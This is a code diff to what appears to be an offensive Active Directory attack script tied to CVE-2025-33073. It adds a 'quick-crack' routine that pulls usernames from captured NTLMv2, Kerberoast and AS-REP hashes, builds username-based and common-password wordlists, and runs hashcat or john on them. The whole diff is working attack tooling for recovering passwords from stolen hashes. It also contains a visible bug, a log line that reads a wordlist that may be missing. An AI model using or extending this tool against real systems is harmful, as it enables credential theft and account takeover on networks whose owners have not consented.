@@ -51,7 +51,7 @@ from typing import Optional
 # Configuration
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 
-VERSION = "4.1.0"
+VERSION = "4.2.0"
 TOOLS_DIR = Path("/opt/tools")
 CVE_DIR = TOOLS_DIR / "CVE-2025-33073"
 
@@ -957,6 +957,51 @@ def try_crack_hashes(cfg: Config) -> Optional[tuple[str, str, str]]:
 
     log.info("🔓 Attempting to crack NTLMv2 hashes...")
 
+    # Quick check: extract usernames from hashes and try username=password
+    # NTLMv2 format: USER::DOMAIN:challenge:response:blob
+    usernames = set()
+    for line in hashfile.read_text().splitlines():
+        if "::" in line:
+            user = line.split("::")[0].strip()
+            if user:
+                usernames.add(user)
+
+    if usernames:
+        # Build a mini wordlist with common weak patterns per user
+        mini_wl = cfg.work_dir / "quick-crack-wordlist.txt"
+        patterns = []
+        for u in usernames:
+            patterns += [
+                u, u.lower(), u.upper(), u.capitalize(),
+                f"{u}1", f"{u}123", f"{u}!", f"{u}1!",
+                u[::-1],  # reversed
+            ]
+        # Add generic weak passwords
+        patterns += [
+            "password", "Password1", "Password123", "P@ssw0rd", "P@ssword1",
+            "Welcome1", "Welcome123", "Changeme1", "Winter2024", "Winter2025",
+            "Winter2026", "Summer2024", "Summer2025", "Summer2026",
+            "Company1", "Company123", "Admin123", "admin", "letmein",
+            "qwerty", "123456", "abc123", "iloveyou", "monkey",
+        ]
+        mini_wl.write_text("\n".join(patterns) + "\n")
+        log.info(f"⚡ Quick-crack: trying {len(patterns)} username-based patterns first...")
+
+        if tool_exists("hashcat"):
+            run(
+                ["hashcat", "-m", "5600", str(hashfile), str(mini_wl),
+                 "--outfile", str(cracked_file), "--outfile-format=2", "--quiet",
+                 "--runtime=10"],
+                cfg, timeout=15
+            )
+        elif tool_exists("john"):
+            run(["john", "--format=netntlmv2", f"--wordlist={mini_wl}", str(hashfile),
+                 "--max-run-time=10"],
+                cfg, timeout=15)
+
+        if cracked_file.exists() and cracked_file.stat().st_size > 0:
+            ok("⚡ Quick-crack hit! Username-based password found")
+
     # Find wordlist
     wordlist = None
     for wl in WORDLISTS:
@@ -980,12 +1025,14 @@ def try_crack_hashes(cfg: Config) -> Optional[tuple[str, str, str]]:
         log.info(f"⚙️  hashcat (NTLMv2/5600) with {wordlist.name}...")
         result = run(
             ["hashcat", "-m", "5600", str(hashfile), str(wordlist),
-             "--outfile", str(cracked_file), "--outfile-format=2", "--quiet"],
-            cfg, timeout=120
+             "--outfile", str(cracked_file), "--outfile-format=2", "--quiet",
+             "--runtime=90"],  # Hard cap: 90 seconds
+            cfg, timeout=120   # Process kill safety net
         )
     elif tool_exists("john"):
         log.info(f"⚙️  john the ripper with {wordlist.name}...")
-        run(["john", "--format=netntlmv2", f"--wordlist={wordlist}", str(hashfile)],
+        run(["john", "--format=netntlmv2", f"--wordlist={wordlist}", str(hashfile),
+             f"--max-run-time=90"],  # Hard cap: 90 seconds
             cfg, timeout=120)
         result = run(["john", "--show", "--format=netntlmv2", str(hashfile)], cfg)
         if result.stdout:
@@ -2790,21 +2837,58 @@ def _crack_roast_hashes(hashfile: Path, mode: int, label: str, cfg: Config) -> l
                 wordlist = plain
                 break
 
-    if not wordlist:
-        log.warning(f"No wordlist found for {label} cracking")
-        return []
-
     if not tool_exists("hashcat"):
         log.warning(f"hashcat not found — cannot crack {label} hashes")
         detail(f"Crack manually: hashcat -m {mode} {hashfile} <wordlist>")
         return []
 
-    log.info(f"Cracking {label} hashes (hashcat mode {mode})...")
-    run(
-        ["hashcat", "-m", str(mode), str(hashfile), str(wordlist),
-         "--outfile", str(cracked_file), "--outfile-format=2", "--quiet"],
-        cfg, timeout=300
-    )
+    # Quick-crack: extract usernames from hashes and try username=password patterns
+    usernames = set()
+    for line in hashfile.read_text().splitlines():
+        if "$" in line:
+            # Kerberoast: $krb5tgs$23$*USER$DOMAIN*...
+            # AS-REP: $krb5asrep$23$USER@DOMAIN:...
+            user_match = re.search(r"\$\*?([^$@:*]+?)[\$@*]", line)
+            if user_match:
+                usernames.add(user_match.group(1))
+
+    if usernames:
+        mini_wl = hashfile.parent / f"{hashfile.stem}-quick-wordlist.txt"
+        patterns = []
+        for u in usernames:
+            patterns += [u, u.lower(), u.upper(), u.capitalize(),
+                         f"{u}1", f"{u}123", f"{u}!", f"{u}1!",
+                         u[::-1]]
+        patterns += ["password", "Password1", "P@ssw0rd", "Welcome1",
+                     "Changeme1", "Winter2026", "Summer2026", "Admin123",
+                     "Company1", "letmein", "qwerty", "123456"]
+        mini_wl.write_text("\n".join(patterns) + "\n")
+        log.info(f"⚡ Quick-crack: trying {len(patterns)} username patterns for {label}...")
+        run(
+            ["hashcat", "-m", str(mode), str(hashfile), str(mini_wl),
+             "--outfile", str(cracked_file), "--outfile-format=2", "--quiet",
+             "--runtime=10"],
+            cfg, timeout=15
+        )
+        if cracked_file.exists() and cracked_file.stat().st_size > 0:
+            ok(f"⚡ Quick-crack hit for {label}!")
+
+    if not wordlist:
+        log.warning(f"No wordlist found for {label} cracking")
+        if cracked_file.exists() and cracked_file.stat().st_size > 0:
+            # Quick-crack found something even without wordlist
+            pass
+        else:
+            return []
+
+    if wordlist:
+        log.info(f"Cracking {label} hashes (hashcat mode {mode})...")
+        run(
+            ["hashcat", "-m", str(mode), str(hashfile), str(wordlist),
+             "--outfile", str(cracked_file), "--outfile-format=2", "--quiet",
+             "--runtime=240"],  # Hard cap: 4 minutes max
+            cfg, timeout=300    # Process kill safety net: 5 minutes
+        )
 
     if not cracked_file.exists() or cracked_file.stat().st_size == 0:
         log.warning(f"No {label} passwords cracked with wordlist {wordlist.name}")
